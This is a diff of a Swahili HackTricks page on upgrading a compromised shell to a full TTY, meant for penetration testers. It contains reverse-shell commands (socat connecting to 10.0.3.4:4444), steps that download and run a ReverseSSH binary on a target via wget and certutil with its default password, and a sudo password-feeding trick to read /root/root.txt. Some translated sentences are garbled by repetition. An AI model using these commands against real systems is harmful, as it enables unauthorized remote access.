@@ -1,22 +1,23 @@
 # TTY Kamili
 
+{% hint style="success" %}
+Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) **na** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repos za github.**
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## TTY Kamili
 
-Tafadhali kumbuka kuwa kabati uliyoweka kwenye kivinjari cha `SHELL` **lazima** iwe **imeorodheshwa ndani** ya _**/etc/shells**_ au `Thamani ya kivinjari cha SHELL haikupatikana kwenye faili ya /etc/shells Tukio hili limeandikishwa`. Pia, tafadhali kumbuka kuwa vipande vifuatavyo vinatumika tu kwenye bash. Ikiwa uko kwenye zsh, badilisha kwenye bash kabla ya kupata kabati kwa kukimbia `bash`.
+Tafadhali kumbuka kwamba kaboti ulioweka katika `SHELL` lazima uwe umetajwa ndani ya _**/etc/shells**_ au `Thamani ya kaboti ya SHELL haikupatikana katika faili ya /etc/shells Tukio hili limepelekwa`. Pia, kumbuka kwamba vipande vya msimbo vifuatavyo vinaweza kufanya kazi tu katika bash. Ikiwa uko katika zsh, badilisha kwa bash kabla ya kupata kaboti kwa kufanya `bash`.
 
 #### Python
 
@@ -29,7 +30,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-Unaweza kupata **idadi** ya **safu** na **staha** kwa kutekeleza **`stty -a`**
+Unaweza kupata **idadi** ya **safu** na **vibambo** kwa kutekeleza **`stty -a`**
 {% endhint %}
 
 #### script
@@ -49,7 +50,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-### **Kuzalisha maboya**
+### **Kuzaliana vikochi**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -64,15 +65,13 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 * vi: `:set shell=/bin/bash:shell`
 * nmap: `!sh`
 
-## ReverseSSH
+## **ReverseSSH**
 
-Njia rahisi ya kupata **upatikanaji wa maboya ya kuingiliana**, pamoja na **uhamishaji wa faili** na **mbelezo wa bandari**, ni kuweka seva ya ssh iliyolinkishwa kwa njia ya kurudisha [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye lengo.
+Njia rahisi ya kupata **upatikanaji wa kikochi cha mwingiliano**, pamoja na **uhamishaji wa faili** na **mbelezo ya bandari**, ni kuweka seva ya ssh iliyolinkishwa kwa njia ya static [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye lengo.
 
-Hapa chini ni mfano kwa `x86` na faili za binary zilizopunguzwa na upx. Kwa faili za binary nyingine, angalia [ukurasa wa matoleo](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hapa chini ni mfano kwa `x86` na programu za upx-compressed. Kwa programu nyingine, angalia [ukurasa wa kutolewa](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Jitayarisha kwenye kompyuta yako ili kupokea ombi la mbelezo la ssh:
-
-{% code overflow="wrap" %}
+1. Jipange kwa ajili ya kupokea ombi la mbelezo la bandari ya ssh kwa kifaa chako:
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
@@ -82,8 +81,6 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 {% endcode %}
 
 * (2a) Lengo la Linux:
-
-{% code overflow="wrap" %}
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
@@ -101,9 +98,7 @@ certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/d
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-{% endcode %}
-
-* Ikiwa ombi la mbele ya SSH limefanikiwa, sasa unapaswa kuweza kuingia kwa nywila ya chaguo-msingi `letmeinbrudipls` katika muktadha wa mtumiaji anayetumia `reverse-ssh(.exe)`:
+* Ikiwa ombi la mbele la mbele la mbele la mbele lilifanikiwa, sasa unapaswa kuweza kuingia kwa nywila ya msingi `letmeinbrudipls` katika muktadha wa mtumiaji anayekimbia `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -113,20 +108,21 @@ sftp -P 8888 127.0.0.1
 ```
 ## Hakuna TTY
 
-Ikiwa kwa sababu fulani huwezi kupata TTY kamili, bado unaweza kuingiliana na programu ambazo zinatarajia kuingiza mtumiaji. Katika mfano ufuatao, nenosiri linapitishwa kwa `sudo` ili kusoma faili:
+Ikiwa kwa sababu fulani huwezi kupata TTY kamili unaweza bado kuingiliana na programu ambazo zinatarajia mwingiliano wa mtumiaji. Katika mfano ufuatao, nenosiri linapitishwa kwa `sudo` ili kusoma faili:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+{% hint style="success" %}
+Jifunze na zoea AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoea GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
